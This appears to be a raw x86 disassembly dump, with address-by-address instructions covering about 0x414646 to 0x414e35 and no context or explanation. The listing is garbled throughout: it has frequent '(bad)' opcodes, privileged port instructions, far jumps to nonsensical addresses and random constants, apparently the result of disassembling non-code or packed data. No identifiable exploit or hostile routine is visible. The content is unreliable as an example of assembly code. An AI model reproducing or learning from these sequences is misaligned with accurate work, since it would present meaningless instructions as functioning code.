  414646:	in     eax,dx
  414647:	std    
  414648:	add    dl,BYTE PTR [ebp+0x47]
  41464b:	gs jno 0x414667
  41464e:	leave  
  41464f:	ret    
  414650:	ins    DWORD PTR es:[edi],dx
  414651:	repz retf 
  414653:	mov    dh,0x61
  414655:	fneni(8087 only) 
  414657:	push   edi
  414658:	retf   0x640
  41465b:	sahf   
  41465c:	ret    
  41465d:	das    
  41465e:	dec    edi
  41465f:	ret    0x1031
  414662:	mov    cl,0x48
  414664:	dec    DWORD PTR [ecx+0x2da62d1e]
  41466a:	adc    edi,edi
  41466c:	pop    ebp
  41466d:	inc    eax
  41466e:	sbb    eax,0xb3e1a8d8
  414673:	in     al,0x6f
  414675:	mov    eax,0x3778754b
  41467a:	pusha  
  41467b:	inc    ecx
  41467c:	xor    al,0x19
  41467e:	sub    al,0xa0
  414680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414681:	xchg   edx,eax
  414682:	mov    edi,0x251f2d6c
  414687:	xchg   edx,eax
  414688:	sub    ah,ch
  41468a:	outs   dx,DWORD PTR fs:[esi]
  41468c:	lock ficomp DWORD PTR [eax+0x6a]
  414690:	sub    BYTE PTR [edx+ebp*8+0x8e3c885],ch
  414697:	jo     0x4146dc
  414699:	fs adc eax,0x5066a58a
  41469f:	sbb    al,0xd3
  4146a1:	sbb    BYTE PTR [edi+ecx*4-0x68],dh
  4146a5:	jbe    0x4146a6
  4146a7:	mov    WORD PTR [esi],gs
  4146a9:	pushf  
  4146aa:	push   cs
  4146ab:	test   BYTE PTR [esi+0x8],dh
  4146ae:	dec    esp
  4146af:	mov    edx,0xd76f9edf
  4146b4:	jl     0x41466f
  4146b6:	xchg   edi,eax
  4146b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146b8:	push   edx
  4146b9:	mov    al,ds:0xfb18582e
  4146be:	sbb    al,ch
  4146c0:	and    ecx,edi
  4146c2:	pop    ss
  4146c3:	mov    WORD PTR [edi+0x60],es
  4146c6:	in     eax,dx
  4146c7:	xchg   edx,eax
  4146c8:	icebp  
  4146c9:	ss jg  0x414690
  4146cc:	in     al,0x6b
  4146ce:	xchg   ebp,eax
  4146cf:	jbe    0x414728
  4146d1:	clc    
  4146d2:	repz or ch,dh
  4146d5:	mov    dl,0xa1
  4146d7:	and    BYTE PTR ds:0x61522b43,dh
  4146dd:	xor    eax,0xaf1aa6f9
  4146e2:	adc    ebx,DWORD PTR [ebx-0x21]
  4146e5:	and    eax,0x4554760a
  4146ea:	sbb    eax,0x570fbc7b
  4146ef:	arpl   WORD PTR [ecx+0x60],si
  4146f2:	lock rol bh,cl
  4146f5:	jbe    0x414688
  4146f7:	xchg   ebx,eax
  4146f8:	adc    eax,0xa23c7750
  4146fd:	out    dx,eax
  4146fe:	nop
  4146ff:	(bad)
  414703:	pop    ebp
  414704:	popf   
  414705:	stos   BYTE PTR es:[edi],al
  414706:	jmp    DWORD PTR [esi+0x6ff7d72f]
  41470c:	xor    BYTE PTR [eax+0x4ad5e9fc],cl
  414712:	jnp    0x41474a
  414714:	les    esi,FWORD PTR [esi+0x4b]
  414717:	es sbb eax,0x187d481f
  41471d:	stos   BYTE PTR es:[edi],al
  41471e:	mov    ds:0x87487563,al
  414723:	jno    0x41473d
  414725:	mov    ebp,0xeb2fbf02
  41472a:	sbb    ah,BYTE PTR [esi+ecx*2+0x75]
  41472e:	dec    ecx
  41472f:	cld    
  414730:	inc    edi
  414731:	adc    eax,0x159bb2eb
  414736:	fsub   st,st(0)
  414738:	push   cs
  414739:	nop
  41473a:	lds    esp,FWORD PTR [edx-0x40ef00dd]
  414740:	mov    ebp,0x722b21d5
  414745:	xchg   ebx,eax
  414746:	(bad)  
  414748:	ret    0x1a2a
  41474b:	retf   0x52b3
  41474e:	add    esp,edi
  414750:	and    dh,BYTE PTR [edi+0x96362aa]
  414756:	outs   dx,DWORD PTR ds:[esi]
  414757:	cwde   
  414758:	adc    DWORD PTR [ecx+0x1ef5a35a],esp
  41475e:	xchg   esp,eax
  41475f:	iret   
  414760:	aas    
  414761:	mov    esp,0x8719937b
  414766:	test   al,0x6
  414768:	mov    ebx,0xe899885e
  41476d:	cs push edx
  41476f:	lds    ebp,FWORD PTR [esi]
  414771:	out    0xb1,eax
  414773:	fs repnz adc eax,0xb198e0ac
  41477a:	call   0x16cf:0xaa1cd26f
  414781:	call   0x72f4d1d0
  414786:	dec    ecx
  414787:	fsubr  DWORD PTR [esp+edx*2+0x22]
  41478b:	mov    ch,BYTE PTR [edx]
  41478d:	mov    ch,0x38
  41478f:	inc    edi
  414790:	pop    esp
  414791:	imul   eax,DWORD PTR [esi+0x5bea6308],0x9b91ff4c
  41479b:	in     eax,dx
  41479c:	hlt    
  41479d:	cmp    DWORD PTR [eax+0x73f22e8a],edx
  4147a3:	sti    
  4147a4:	shl    BYTE PTR [esi+ebx*1+0x7],0x54
  4147a9:	mov    WORD PTR [ebp-0x68],ds
  4147ac:	loope  0x41475a
  4147ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147af:	loop   0x41479a
  4147b1:	xchg   ebx,eax
  4147b2:	or     al,0x90
  4147b4:	add    al,0xcd
  4147b6:	fwait
  4147b7:	inc    ebp
  4147b8:	sub    BYTE PTR [eax+0x1dd29935],ah
  4147be:	test   DWORD PTR [ecx-0x1b],eax
  4147c1:	and    eax,0x38a2b05d
  4147c6:	adc    bh,ah
  4147c8:	push   0xffffff90
  4147ca:	jns    0x4147ce
  4147cc:	shr    DWORD PTR [edx],1
  4147ce:	add    BYTE PTR [eax-0x64],dl
  4147d1:	pop    eax
  4147d2:	fadd   DWORD PTR [esi+0x7e04e9f5]
  4147d8:	push   es
  4147d9:	je     0x4147b0
  4147db:	mov    bl,BYTE PTR [ebx-0x6f]
  4147de:	int3   
  4147df:	sbb    BYTE PTR [ebp+0x44],ch
  4147e2:	cmp    BYTE PTR [ebx-0x5],0x46
  4147e6:	mov    DWORD PTR [edx+0x3fba001c],edx
  4147ec:	mov    al,ds:0xd8abd7c3
  4147f1:	push   ds
  4147f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147f3:	xchg   esi,eax
  4147f4:	pop    edx
  4147f5:	or     BYTE PTR [ebx+0x4aaeae36],0xcf
  4147fc:	loop   0x4147b5
  4147fe:	cdq    
  4147ff:	jl     0x4147b6
  414801:	shr    BYTE PTR [ebp+0x20],1
  414804:	shl    esp,1
  414806:	or     BYTE PTR [ebp+0x7d3c0862],0xdd
  41480d:	fwait
  41480e:	sbb    cl,dl
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	cmp    ecx,DWORD PTR [ebx]
  414813:	daa    
  414814:	sar    BYTE PTR [edx+eax*4],1
  414817:	push   eax
  414818:	mov    ch,BYTE PTR [ecx-0x3678dbe3]
  41481e:	ins    BYTE PTR es:[edi],dx
  41481f:	aam    0x95
  414821:	or     al,0x4e
  414823:	mov    BYTE PTR [edi],cl
  414825:	stc    
  414826:	dec    eax
  414827:	mov    edi,0x2c594242
  41482c:	test   ebx,0xedce0379
  414832:	dec    edi
  414833:	cwde   
  414834:	jl     0x414803
  414836:	sbb    eax,0x9f57292a
  41483b:	loopne 0x4147dd
  41483d:	adc    eax,0x98bd655c
  414842:	xor    ebp,ebx
  414844:	jg     0x414845
  414846:	jo     0x4147dc
  414848:	lds    ecx,FWORD PTR [ebx-0x6f]
  41484b:	and    esp,ecx
  41484d:	call   0xc1d1da13
  414852:	xor    esi,DWORD PTR [ebp-0x3e]
  414855:	lods   al,BYTE PTR ds:[esi]
  414856:	push   ecx
  414857:	jne    0x414844
  414859:	mov    BYTE PTR [eax-0x2d],0x21
  41485d:	std    
  41485e:	(bad)  
  41485f:	(bad)  
  414860:	xchg   edx,eax
  414861:	push   edi
  414862:	jp     0x414839
  414864:	cmp    eax,0xbd9f9ba0
  414869:	sti    
  41486a:	call   0x1f314d62
  41486f:	fisttp WORD PTR [esi-0x4ff8e27a]
  414875:	mov    bl,0x62
  414877:	xor    BYTE PTR [ecx-0x15],dh
  41487a:	sub    DWORD PTR [esi],ebx
  41487c:	in     al,0x96
  41487e:	dec    ebp
  41487f:	mov    esp,0x51483962
  414884:	or     al,0xcc
  414886:	lods   al,BYTE PTR ds:[esi]
  414887:	repz aam 0x18
  41488a:	ret    
  41488b:	push   ecx
  41488c:	int3   
  41488d:	add    BYTE PTR [eax+ecx*4+0x693b5b76],ah
  414894:	arpl   WORD PTR [ebx],cx
  414896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414897:	pop    edi
  414898:	pop    ecx
  414899:	sub    dh,ah
  41489b:	(bad)
  41489e:	data16 int 0x82
  4148a1:	adc    BYTE PTR [ecx],cl
  4148a3:	mov    es,WORD PTR [ebx-0x4e]
  4148a6:	popf   
  4148a7:	(bad)  
  4148a8:	jno    0x414845
  4148aa:	loopne 0x414882
  4148ac:	xchg   BYTE PTR [eax+0x4a4aa68b],ah
  4148b2:	sub    DWORD PTR [ebx-0x46],esp
  4148b5:	xlat   BYTE PTR ds:[ebx]
  4148b6:	sti    
  4148b7:	stos   DWORD PTR es:[edi],eax
  4148b8:	jmp    0x4148e5
  4148ba:	mov    bl,0x88
  4148bc:	jle    0x414870
  4148be:	stc    
  4148bf:	test   esp,ecx
  4148c1:	fdiv   DWORD PTR [eax+0x26]
  4148c4:	mov    ah,0xae
  4148c6:	cmp    al,0x3b
  4148c8:	repnz pop ecx
  4148ca:	jno    0x4148dd
  4148cc:	and    DWORD PTR [eax-0x12c04be1],0xffffff8e
  4148d3:	scas   al,BYTE PTR es:[edi]
  4148d4:	loop   0x41494b
  4148d6:	adc    edx,ebp
  4148d8:	mov    esi,0x384c2095
  4148dd:	test   bh,dl
  4148df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148e0:	push   esp
  4148e1:	add    eax,0x14db52b8
  4148e6:	ds jmp 0x414933
  4148e9:	test   BYTE PTR [edx-0x28641cfb],ah
  4148ef:	loope  0x414881
  4148f1:	ss pop edx
  4148f3:	lock sbb al,BYTE PTR [edx-0x32dfdc9c]
  4148fa:	xlat   BYTE PTR ds:[ebx]
  4148fb:	sbb    al,0xe5
  4148fd:	sbb    DWORD PTR [edi],edi
  4148ff:	add    BYTE PTR [esi+esi*2],ah
  414902:	dec    edx
  414903:	pop    ds
  414904:	cwde   
  414905:	cmp    eax,0x888d25e8
  41490a:	push   eax
  41490b:	pop    esi
  41490c:	aas    
  41490d:	retf   0x6663
  414910:	or     BYTE PTR [ebp-0x4754147],bl
  414916:	cmp    eax,0x91d99df7
  41491b:	mov    al,0x64
  41491d:	sbb    eax,0x62ebde3e
  414922:	mov    eax,0x4420dee0
  414927:	lock adc BYTE PTR [edi+0x36],dl
  41492b:	push   esi
  41492c:	cdq    
  41492d:	scas   al,BYTE PTR es:[edi]
  41492e:	push   ebp
  41492f:	mov    ds:0xb47da00b,eax
  414934:	div    DWORD PTR [esi+0x543ec36f]
  41493a:	xchg   ebp,eax
  41493b:	js     0x414919
  41493d:	push   ds
  41493e:	in     al,0xd7
  414940:	jmp    0x60dd1a5b
  414945:	jbe    0x4148fb
  414947:	ja     0x4149a4
  414949:	jecxz  0x414962
  41494b:	loopne 0x4148d1
  41494d:	das    
  41494e:	rol    DWORD PTR [eax],cl
  414950:	cmp    DWORD PTR [esp+ebp*2],ebp
  414953:	jbe    0x4149c5
  414955:	(bad)  
  414956:	cwde   
  414957:	and    eax,0x17884426
  41495c:	jno    0x4149dd
  41495e:	xlat   BYTE PTR ds:[ebx]
  41495f:	jne    0x4149ac
  414961:	xor    BYTE PTR [ebp+0x32],bl
  414964:	pop    ecx
  414965:	pusha  
  414966:	outs   dx,DWORD PTR ds:[esi]
  414967:	ins    DWORD PTR es:[edi],dx
  414968:	mov    esi,0xbf546be9
  41496d:	add    eax,0xa8bfa65a
  414972:	cli    
  414973:	jbe    0x414927
  414975:	out    dx,eax
  414976:	(bad)  [ebx+0x35821131]
  41497c:	jmp    0x6d6f72ad
  414981:	fnstsw WORD PTR [edi]
  414983:	or     al,0x89
  414985:	aam    0xa8
  414987:	pushf  
  414988:	xor    al,0x8c
  41498a:	or     esp,ebx
  41498c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41498d:	xchg   ebp,ebx
  41498f:	daa    
  414990:	shl    esi,cl
  414992:	(bad)
  414996:	or     bl,BYTE PTR [edi]
  414998:	cld    
  414999:	jle    0x4149f1
  41499b:	or     eax,DWORD PTR [esi]
  41499d:	(bad)  
  41499e:	retf   
  41499f:	es and al,0x80
  4149a2:	mov    ds:0x75ad1368,eax
  4149a7:	push   ss
  4149a8:	fnstenv [ebx-0x79910ac3]
  4149ae:	push   es
  4149af:	sbb    al,0x48
  4149b1:	jmp    0x89923b0a
  4149b6:	out    dx,eax
  4149b7:	adc    al,0x28
  4149b9:	psrld  mm2,QWORD PTR [eax+0x3f7af902]
  4149c0:	adc    bl,BYTE PTR [edx]
  4149c2:	scas   eax,DWORD PTR es:[edi]
  4149c3:	rol    DWORD PTR [esp+eax*8-0x69],0x63
  4149c8:	test   eax,0x54ddada6
  4149cd:	xchg   dl,ch
  4149cf:	adc    DWORD PTR [edi+ebx*1],ebx
  4149d2:	jns    0x4149bb
  4149d4:	sub    cl,al
  4149d6:	pop    ebp
  4149d7:	and    esi,esp
  4149d9:	xor    BYTE PTR [esi+0x71],ch
  4149dc:	clc    
  4149dd:	jae    0x414991
  4149df:	mov    ch,0x31
  4149e1:	pop    ecx
  4149e2:	jns    0x4149cf
  4149e4:	sahf   
  4149e5:	shl    BYTE PTR [edx+eax*8+0x73],1
  4149e9:	int3   
  4149ea:	adc    edx,DWORD PTR [esp+ecx*1+0x23a4dd1f]
  4149f1:	cmp    ch,BYTE PTR [edx-0x7780238]
  4149f7:	dec    DWORD PTR [edx]
  4149f9:	test   eax,0x32824e28
  4149fe:	ret    
  4149ff:	(bad)  
  414a00:	hlt    
  414a01:	popa   
  414a02:	dec    ebx
  414a03:	pop    ss
  414a04:	dec    esp
  414a05:	cmp    eax,ebx
  414a07:	push   ebp
  414a08:	aam    0x6c
  414a0a:	fwait
  414a0b:	push   0x6a627276
  414a10:	scas   al,BYTE PTR es:[edi]
  414a11:	(bad)  
  414a13:	mov    dh,0x8d
  414a15:	add    esi,DWORD PTR ds:0xd1075d1d
  414a1b:	dec    eax
  414a1c:	scas   al,BYTE PTR es:[edi]
  414a1d:	push   0xffffffea
  414a1f:	inc    ebx
  414a20:	mov    cl,0x3f
  414a22:	out    dx,eax
  414a23:	jmp    edx
  414a25:	jl     0x4149d5
  414a27:	or     eax,0xfd864324
  414a2c:	test   dh,cl
  414a2e:	outs   dx,DWORD PTR ds:[esi]
  414a2f:	inc    eax
  414a30:	jl     0x414a93
  414a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a33:	or     eax,0x2c360437
  414a38:	mov    es,WORD PTR [eax]
  414a3a:	or     BYTE PTR [esi],bl
  414a3c:	dec    eax
  414a3d:	rcl    ebp,cl
  414a3f:	gs xor eax,ecx
  414a42:	fld    TBYTE PTR ds:[eax+0x36]
  414a46:	lds    esi,FWORD PTR [esi]
  414a48:	and    al,bl
  414a4a:	ror    bl,0x2a
  414a4d:	xchg   esi,eax
  414a4e:	mov    ch,0x86
  414a50:	popa   
  414a51:	and    al,0xfd
  414a53:	daa    
  414a54:	cwde   
  414a55:	out    dx,eax
  414a56:	ret    0x4630
  414a59:	push   edx
  414a5a:	out    0x4e,al
  414a5c:	(bad)  
  414a5d:	call   0xba7d57cb
  414a62:	out    dx,eax
  414a63:	dec    edi
  414a64:	jmp    0xd0b5e298
  414a69:	mov    ecx,0xed28fb1c
  414a6e:	mov    ss,WORD PTR [ebx]
  414a70:	push   esp
  414a71:	add    eax,0x3dab2da9
  414a76:	and    BYTE PTR [ebp-0x7d2a6182],bl
  414a7c:	or     eax,0xa0ce2752
  414a81:	(bad)  
  414a83:	or     DWORD PTR [edi+edx*4+0x3ea2ee07],0xea49e1be
  414a8e:	xchg   edi,eax
  414a8f:	fidiv  DWORD PTR [esi]
  414a91:	mov    ecx,0xb99fc1b7
  414a96:	mov    cl,al
  414a98:	test   al,0xb9
  414a9a:	push   eax
  414a9b:	inc    edi
  414a9c:	or     al,dl
  414a9e:	xor    ebp,DWORD PTR ds:0xf8a3151a
  414aa4:	sub    DWORD PTR [ebp+eiz*2+0x5037dfee],ecx
  414aab:	or     BYTE PTR [ebx-0x8],cl
  414aae:	xchg   edx,eax
  414aaf:	mov    ds:0xc729a05f,al
  414ab4:	mov    bl,0xca
  414ab6:	imul   esp,edi,0x5ce55968
  414abc:	xchg   ecx,eax
  414abd:	sbb    BYTE PTR ds:0xb0d167fb,bh
  414ac3:	cwde   
  414ac4:	jo     0x414b24
  414ac6:	add    al,0x22
  414ac8:	clc    
  414ac9:	aaa    
  414aca:	enter  0x7f77,0x39
  414ace:	or     bl,BYTE PTR [ecx]
  414ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ad1:	pop    ds
  414ad2:	xchg   ebp,eax
  414ad3:	sbb    al,0xb7
  414ad5:	cs push 0xc7b77d35
  414adb:	sbb    DWORD PTR [edi],ebp
  414add:	adc    dl,BYTE PTR [eax-0xf20f814]
  414ae3:	jmp    0x5c86:0x6da6ce51
  414aea:	inc    ecx
  414aeb:	dec    esp
  414aec:	mov    ch,0xad
  414aee:	jae    0x414b4f
  414af0:	pop    eax
  414af1:	out    0xb2,al
  414af3:	mov    BYTE PTR [esi-0x7c5a8406],bh
  414af9:	push   ss
  414afa:	(bad)  
  414afb:	hlt    
  414afc:	fs jmp 0x7159:0xf38defe2
  414b04:	imul   ebx,ebp,0xffffffb0
  414b07:	cmp    eax,0xa08d5fd3
  414b0c:	stc    
  414b0d:	sbb    BYTE PTR [edi+esi*8+0x59],al
  414b11:	mov    edi,0x2d712762
  414b16:	push   ds
  414b17:	aam    0xd3
  414b19:	inc    edx
  414b1a:	xor    edx,DWORD PTR [edi+eiz*1]
  414b1d:	xchg   ecx,eax
  414b1e:	xor    al,0x79
  414b20:	cmp    eax,0x1ad4d078
  414b25:	sbb    ebp,DWORD PTR [ecx]
  414b27:	ds pop edx
  414b29:	retf   
  414b2a:	in     eax,dx
  414b2b:	retf   0xef7d
  414b2e:	xor    BYTE PTR [edx],ch
  414b30:	dec    ebp
  414b31:	pop    ecx
  414b32:	sbb    al,0xb9
  414b34:	mov    ?,WORD PTR ds:0xdd01b54b
  414b3a:	into   
  414b3b:	xchg   DWORD PTR [edi-0x3],eax
  414b3e:	loopne 0x414b57
  414b40:	or     al,dh
  414b42:	mov    ds:0x1acfb753,al
  414b47:	cmp    esi,esp
  414b49:	ret    0xca6f
  414b4c:	xchg   esi,esp
  414b4e:	aad    0x3e
  414b50:	sti    
  414b51:	cli    
  414b52:	repnz ins BYTE PTR es:[edi],dx
  414b54:	push   ds
  414b55:	dec    ebp
  414b56:	lea    edi,[edi+0x2d86e313]
  414b5c:	cdq    
  414b5d:	mov    ds:0xea924264,al
  414b62:	and    ecx,edx
  414b64:	jnp    0x414aeb
  414b66:	sub    ebp,esi
  414b68:	js     0x414b14
  414b6a:	das    
  414b6b:	fiadd  DWORD PTR [esp+ebx*8-0x5db9020e]
  414b72:	add    DWORD PTR [edi-0x7cf8cb8],ecx
  414b78:	and    eax,0x567eff86
  414b7d:	and    ch,BYTE PTR [eax]
  414b7f:	fcmovnbe st,st(2)
  414b81:	mov    ch,0x7
  414b83:	xor    DWORD PTR [ecx-0x6409f9bb],esi
  414b89:	es jecxz 0x414b5b
  414b8c:	mov    esp,0xebdd952a
  414b91:	jnp    0x414bdb
  414b93:	push   ecx
  414b94:	ja     0x414bf2
  414b96:	mov    al,0x67
  414b98:	push   esi
  414b99:	out    dx,al
  414b9a:	rol    BYTE PTR [edi-0x68],0x1d
  414b9e:	loope  0x414b5b
  414ba0:	mov    dl,0xd9
  414ba2:	iret   
  414ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ba4:	hlt    
  414ba5:	in     al,0x14
  414ba7:	pop    es
  414ba8:	lods   al,BYTE PTR fs:[esi]
  414baa:	repz and DWORD PTR [ecx+0x25],ebp
  414bae:	pop    edi
  414baf:	mov    dh,0xa4
  414bb1:	rcr    BYTE PTR [edx+eax*4-0xc15d1bd],cl
  414bb8:	je     0x414b92
  414bba:	(bad)  
  414bbb:	mov    ch,0xb3
  414bbd:	test   ecx,edx
  414bbf:	or     al,ah
  414bc1:	mov    ch,BYTE PTR [edx]
  414bc3:	mov    dh,0x36
  414bc5:	jnp    0x414bb4
  414bc7:	jp     0x414bbc
  414bc9:	jno    0x414bfc
  414bcb:	enter  0x5fc1,0x3e
  414bcf:	sbb    BYTE PTR [ecx],dh
  414bd1:	xchg   ecx,eax
  414bd2:	aaa    
  414bd3:	loopne 0x414bee
  414bd5:	add    bl,BYTE PTR [eax+0x1719d7dd]
  414bdb:	and    al,0xb6
  414bdd:	sub    eax,eax
  414bdf:	fisub  WORD PTR [edi+0x71545e24]
  414be5:	not    BYTE PTR [ecx]
  414be7:	sub    DWORD PTR ds:0xec4c06a2,ecx
  414bed:	fmul   QWORD PTR [ebp-0x33]
  414bf0:	lock out 0xec,al
  414bf3:	(bad)  
  414bf4:	push   ecx
  414bf5:	xor    DWORD PTR [ebp+0x30],eax
  414bf8:	pop    ebp
  414bf9:	dec    eax
  414bfa:	or     edx,DWORD PTR [ebp-0x75]
  414bfd:	into   
  414bfe:	mov    ds:0xf549f9d3,eax
  414c03:	pushf  
  414c04:	inc    DWORD PTR [ebp+ebx*2-0x25e7ad4e]
  414c0b:	scas   eax,DWORD PTR es:[edi]
  414c0c:	lea    ebp,[edx-0x447ad6f4]
  414c12:	jno    0x414be1
  414c14:	aad    0x98
  414c16:	(bad)  
  414c17:	dec    eax
  414c18:	enter  0x313a,0xca
  414c1c:	mov    WORD PTR [ebx+0x3d],gs
  414c1f:	iret   
  414c20:	push   ecx
  414c21:	mov    al,0x81
  414c23:	fcomp  QWORD PTR [eax+0x15]
  414c26:	rol    BYTE PTR [eax*1-0x39996fef],0xf4
  414c2e:	xchg   edi,eax
  414c2f:	clc    
  414c30:	push   ebp
  414c31:	pop    ebp
  414c32:	aad    0xe2
  414c34:	(bad)  
  414c35:	jmp    0x26d1:0xa21c2566
  414c3c:	or     eax,0x3f1870e3
  414c41:	or     ah,BYTE PTR [edx+0x68c584f3]
  414c47:	jle    0x414bd7
  414c49:	add    eax,edx
  414c4b:	fsub   QWORD PTR [eax+0x3ebb3271]
  414c51:	adc    bl,BYTE PTR [ebx]
  414c53:	xchg   edx,eax
  414c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c55:	sbb    edx,eax
  414c57:	and    al,0x3b
  414c59:	icebp  
  414c5a:	lods   eax,DWORD PTR ds:[esi]
  414c5b:	adc    DWORD PTR [edi],edx
  414c5d:	dec    eax
  414c5e:	imul   BYTE PTR [ecx-0x19ebca80]
  414c64:	sbb    eax,DWORD PTR [esi]
  414c66:	mov    esp,0x3bc98337
  414c6b:	push   edx
  414c6c:	sub    BYTE PTR [ebx],dh
  414c6e:	and    eax,esp
  414c70:	push   esp
  414c71:	mov    ah,0xe7
  414c73:	mov    ecx,0x30d0636f
  414c78:	shl    ecx,1
  414c7a:	test   ecx,esp
  414c7c:	jns    0x414c21
  414c7e:	arpl   WORD PTR [eax],sp
  414c80:	iret   
  414c81:	(bad)  
  414c82:	jg     0x414cb1
  414c84:	mov    al,ds:0x555de741
  414c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c8a:	shl    DWORD PTR [si-0x7de1],cl
  414c8f:	push   ebx
  414c90:	pushf  
  414c91:	jmp    0x5839b4de
  414c96:	inc    DWORD PTR [esi-0x30d3ae82]
  414c9c:	add    ch,cl
  414c9e:	mov    ecx,?
  414ca0:	clc    
  414ca1:	ins    BYTE PTR es:[edi],dx
  414ca2:	ror    DWORD PTR [ecx-0x28bb0921],1
  414ca8:	mov    ch,BYTE PTR [ecx+0x8]
  414cab:	dec    ebx
  414cac:	push   ss
  414cad:	jno    0x414d18
  414caf:	call   0x366473da
  414cb4:	add    eax,0x748009a5
  414cb9:	jnp    0x414cc4
  414cbb:	jno    0x414c81
  414cbd:	cmp    ebp,esi
  414cbf:	xor    bh,bl
  414cc1:	test   BYTE PTR [ebx-0x72ba559],cl
  414cc7:	(bad)  
  414cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cca:	mov    ch,0xd9
  414ccc:	(bad)  
  414ccd:	push   edx
  414cce:	mov    WORD PTR [edx],fs
  414cd0:	and    al,bh
  414cd2:	sub    ah,BYTE PTR ds:0x6a95632e
  414cd8:	jo     0x414c78
  414cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cdb:	xor    BYTE PTR [ebx+0x63],bl
  414cde:	jmp    0xe7dbb57c
  414ce3:	ss jne 0x414c67
  414ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ce7:	dec    edx
  414ce8:	push   edi
  414ce9:	jmp    0x7bf2:0xe9c55a6c
  414cf0:	rcl    DWORD PTR [ebx-0x3b80cb28],1
  414cf6:	jmp    0xd8c69f3c
  414cfb:	sub    al,0x55
  414cfd:	(bad)  
  414cfe:	rcl    esp,cl
  414d00:	mul    BYTE PTR [ecx]
  414d02:	leave  
  414d03:	jb     0x414d21
  414d05:	cmp    BYTE PTR ds:0x7b0a5f43,ah
  414d0b:	out    dx,al
  414d0c:	adc    BYTE PTR [edx-0x5a185ce4],bl
  414d12:	hlt    
  414d13:	aam    0xf7
  414d15:	push   ss
  414d16:	add    DWORD PTR [edx-0x26ffcd48],edi
  414d1c:	inc    esi
  414d1d:	arpl   WORD PTR [edx],si
  414d1f:	sbb    DWORD PTR [edi+0xd1822d1],0xffffffda
  414d26:	cmp    BYTE PTR [ecx+0x4597d5fa],bl
  414d2c:	scas   eax,DWORD PTR es:[edi]
  414d2d:	je     0x414d9b
  414d2f:	retf   0x78f1
  414d32:	call   0x2613:0xf3cc1d2c
  414d39:	sub    ch,BYTE PTR [edx]
  414d3b:	mov    edi,0x742847bd
  414d40:	not    DWORD PTR [edx-0xe]
  414d43:	push   ds
  414d44:	cs add al,0xa
  414d47:	lahf   
  414d48:	adc    al,0xbd
  414d4a:	ss jmp 0x414d6e
  414d4d:	adc    eax,0xaf513f6d
  414d52:	inc    esp
  414d53:	cwde   
  414d54:	std    
  414d55:	jo     0x414dd0
  414d57:	sub    BYTE PTR ss:[esp+edx*2-0x49cc9f77],0x50
  414d60:	dec    esp
  414d61:	inc    eax
  414d62:	add    al,0xbe
  414d64:	jp     0x414cef
  414d66:	fcomp  DWORD PTR [edx]
  414d68:	repz sub DWORD PTR [esp+eax*2+0x79],esp
  414d6d:	mov    eax,ds:0x6a411642
  414d72:	retf   
  414d73:	aas    
  414d74:	daa    
  414d75:	push   es
  414d76:	(bad)  
  414d77:	call   0xee2e492d
  414d7c:	(bad)  
  414d7d:	in     al,dx
  414d7e:	aas    
  414d7f:	adc    DWORD PTR [ecx-0x6c],ecx
  414d82:	jmp    0x669529f2
  414d87:	(bad)  
  414d88:	sar    DWORD PTR [esp+ebp*4-0x14],1
  414d8c:	sub    BYTE PTR [edi-0x2672dda9],dl
  414d92:	out    0xdf,eax
  414d94:	jmp    0x651a:0x9314e422
  414d9b:	xchg   ebx,eax
  414d9c:	push   esi
  414d9d:	adc    DWORD PTR [eax-0x10be19],ebx
  414da3:	add    eax,0xf20b89e6
  414da8:	outs   dx,BYTE PTR ds:[esi]
  414da9:	and    al,0x27
  414dab:	out    dx,eax
  414dac:	std    
  414dad:	cmp    DWORD PTR [ebp+eax*4-0x7],0x5e
  414db2:	call   0x1f6e1eae
  414db7:	pop    esi
  414db8:	hlt    
  414db9:	es jmp 0x414de9
  414dbc:	inc    eax
  414dbd:	ds div ebx
  414dc0:	enter  0x40c9,0xf1
  414dc4:	push   edx
  414dc5:	mov    ?,WORD PTR [edx-0x6f]
  414dc8:	fld    QWORD PTR [ebp-0x5b47c03c]
  414dce:	sub    ebp,DWORD PTR [esi+0x583f82b1]
  414dd4:	xchg   DWORD PTR [eax],esp
  414dd6:	dec    ebp
  414dd7:	sub    DWORD PTR [ebx-0x3cd5d848],esp
  414ddd:	sub    ecx,DWORD PTR [ebx-0x69]
  414de0:	jge    0x414df3
  414de2:	ds cmp ebp,ecx
  414de5:	je     0x414d82
  414de7:	push   0xdf65c87
  414dec:	ins    BYTE PTR es:[edi],dx
  414ded:	xor    eax,0x45910c6c
  414df2:	jae    0x414d98
  414df4:	pop    edx
  414df5:	push   es
  414df6:	pop    ds
  414df7:	jno    0x414dea
  414df9:	jge    0x414d7e
  414dfb:	cmp    al,cl
  414dfd:	imul   ecx,DWORD PTR [ebx-0x75],0xc208b679
  414e04:	test   esp,0xf01f502d
  414e0a:	sub    edx,DWORD PTR [esi]
  414e0c:	pop    ecx
  414e0d:	mov    ah,0xbe
  414e0f:	and    eax,0x86022a02
  414e14:	fwait
  414e15:	sub    dl,BYTE PTR [ebx+0x3]
  414e18:	mov    ah,0x69
  414e1a:	mov    ds:0xa1e94b28,al
  414e1f:	sbb    ebx,DWORD PTR [esi-0x1a]
  414e22:	adc    ecx,edi
  414e24:	pushf  
  414e25:	jge    0x414ea2
  414e27:	adc    al,0x34
  414e29:	push   ss
  414e2a:	mov    ebp,0x70a441e4
  414e2f:	fwait
  414e30:	dec    edi
  414e31:	push   edx
  414e32:	push   cs
  414e33:	fwait
  414e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e35:	cmp    eax,edi
